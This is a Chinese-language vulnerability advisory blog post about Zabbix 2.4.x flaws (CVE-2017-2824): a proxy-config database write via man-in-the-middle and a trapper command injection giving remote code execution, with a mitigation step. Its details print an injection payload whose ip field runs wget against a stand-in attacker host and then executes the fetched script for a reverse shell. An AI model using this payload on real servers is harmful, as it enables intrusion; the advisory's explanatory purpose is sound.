【漏洞预警】Zabbix 2.4.7–2.4.8r1高危漏洞(CVE-2017-2824)

Stbird • 2017年4月28日 • 漏洞预警 • 阅读 1287

简介

 zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级开源解决方案。

zabbix能监视各种网络参数，保证服务器系统的安全运营;并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix旨在使组织能够监控其网络中各种系统的健康状况和状态，包括：网络服务，服务器和网络设备。

zabbix由2部分构成，zabbix server与可选组件zabbix agent。

Zabbix Proxy Server写入漏洞(CVE-2017-2824)

漏洞编号：

CVE-2017-2824

漏洞概述：

当配置为active proxy模式时，Zabbix Proxy将在启动时向Zabbix server发送“proxy config”请求，并一直定期发送。Zabbix server以未加密的状态发送proxy config来响应这些请求。虽然Zabbix server使用硬编码的数据库表名称列表来创建proxy config，所述的zabbix proxy不利用这样的列表或者是从服务器接收到的响应中的任何验证。攻击者可通过中间人（MITM）的方式恶意地操纵这些响应，从而允许攻击者在Zabbix proxy上写入数据库。

简单的说就是，Zabbix 2.4.x中的trapper功能存在一处数据库写入漏洞，特定的恶意Trapper数据包可通过database的逻辑检查，造成数据库写入，攻击者可通过中间人的方式修改活动中的zabbix  proxy和Server之间的请求来触发漏洞。

影响版本:

Zabbix 2.4.7 – 2.4.8r1

细节：

zabbix  proxy发出的Trapper请求之一是ìproxy configî请求，它允许代理从Zabbix Server请求自己的proxy配置（当他们知道该设备的主机名，可以请求任何其他的ZabbixProxyís配置）。发生这种情况时，Zabbix Server从其数据库中提取给特定的Zabbix Proxy不同的配置。虽然Zabbix服务器会在搜索要发送到代理的所需配置数据时会查看硬编码表，但对Zabbix Proxy将应用什么数据库没有限制。

因此，如果攻击者能够将Zabbix Proxy和Zabbix Server的流量置于中间，则攻击者可以将任意JSON插入到服务器的配置响应中，Zabbix Proxy将毫不犹豫地应用配置。这是双重的，因为代理配置数据在本地网络上未加密地通信，任何与 Zabbix Server进行网络连接的用户都允许利用此攻击。

由于定期从代理发送ìproxyconfigî请求到服务器，攻击者可以使用proxy serve拦截流量并将任意数据插入数据库，只要destination table是Zabbix proxy数据库中的有效表。

Zabbix Server Active Proxy Trapper 远程代码执行漏洞 (CVE-2017-2824)

漏洞编号：

CVE-2017-2824

漏洞概述：

默认情况下，Zabbix Server向Zabbix Proxy公开了一系列API，负责discovery和配置任务，它们是根据Zabbix Proxy使用该API提供的信息创建和执行的。与这些API相关联的“discovery”请求中存在命令注入漏洞，允许攻击者将任意命令插入Zabbix数据库。攻击者可以通过发送一个特定的<command>请求指定记录以前创建的相关<hostid>来执行攻击者插入的注入命令。这可能允许攻击者在Zabbix服务器上实现远程代码执行。

也就是说，Zabbix 2.4.x中的trapper command功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码，攻击者可以从活动的Zabbix proxy 发出请求从而促发漏洞。

影响范围：

Zabbix Server 2.4.8.r1

缓解方法：

删除Zabbix数据库中的默认脚本条目，可以直接操作数据库删除 sql 为： use zabbix; delete * from scripts;  ，也可使用图形界面删除 (Administration->Scripts->Checkmarks->Delete Selected).

细节：

该漏洞位于Zabbix中的“ Trapper”代码部分，它的主要功能是允许Proxy和Server进行通信的网络服务（TCP端口10051）Zabbix Server提供了一组针对Zabbix Proxy的API调用，两个将讨论的是“discovery data”和“request command”。这些请求的示例数据如下所示：

'{"request":"command","scriptid":1,"hostid":10001}'

'{"request":"discovery data","host":"zabbix-proxy.com","clock":10,
"data":[{"clock":10,"drule":1,"dcheck2,"type":0,"ipî:î10.0.0.1î, "dns":"zabbix-agent.com",
 ìport":10050,"key":"test","status":0,"value":"test_value"}]}

应该注意的是，request命令调用位于Zabbix数据库中的脚本，而不会进行任何身份验证。该漏洞的另一个关键方面是，默认情况下，Zabbix 2.4.X使用脚本以下表中的3个脚本填充MySQL数据库：

# scriptid == 1 == /bin/ping -c {HOST.CONN} 2>&1
# scriptid == 2 == /usr/bin/traceroute {HOST.CONN} 2>&1
# scriptid == 3 == sudo /usr/bin/nmap -O {HOST.CONN} 2>&1

问题在于，在调用脚本时，{HOST.CONN}字段实际上被host的IP地址替换。替换{HOST.CONN}的值位于Zabbixinterface表中，然后保存成VARCHAR（64）类型的“IP”字段。因此，如果攻击者可以使用命令注入创建接口作为IP地址，并且通过“command”请求的方式运行{HOST.CONN}脚本，则将发生命令注入，并且可以获得反向shell。

这个难题在于有效地将值插入到Zabbixhost表。默认情况下，未经身份验证的攻击者无法做到这一点，它需要系统管理员的一个次要配置，特别是关于Zabbix自动发现功能。

Zabbix自动发现和自动注册功能允许根据Zabbix Proxy提供的Zabbix Server数据进行Zabbix Server的配置。更具体地说，如果主机根据服务器的配置向Zabbix Proxy提供某些特性，则可能会采取某些操作，其中一个会使新发现的主机被添加到某些Zabbix数据库表中。在这种情况下，主机将被插入到“host”表中，并且将创建一个入口到Zabbixinterface表中，主机提供的IP地址插入到IP列中，而不会对该IP地址的任何验证。

因此，通过使用合适的主机向服务器发送一个发现数据请求，可以将命令注入插入到数据库中：

 write_script_cmd = '{
 "request":"discovery data",
 "host":"zabbix-proxy.domain.fake",
 "clock":148535399,
 "data":[{
 "clock":1485353070,
 "drule":88,
 "dcheck":174,
 "type":0,
 "ip":";wget -O /tmp/s http://attacker-ip/s;#",
 "dns":"host28.domain.fake",
 "port":10050,
 "key":"sectest",
 "status":0,
 "value":"lnx<(^_^)>host"
}]}'

由于ZabbixInterface表的ip字段的大小限制，第二个主机被插入到另一个IP地址的表中。

// Host 2
ip:/bin/bash /tmp/s;#

在这两个主机被添加之后，仍然有一个问题，即不知道该hostid的command请求，但是这很容易解决了。暴力请求入数据库，因为不同的命令请求会返回不同的响应，确定主机是否存在，一旦存在的主机被确定，就可以直接调用它们，并且可以获得反向的shell。
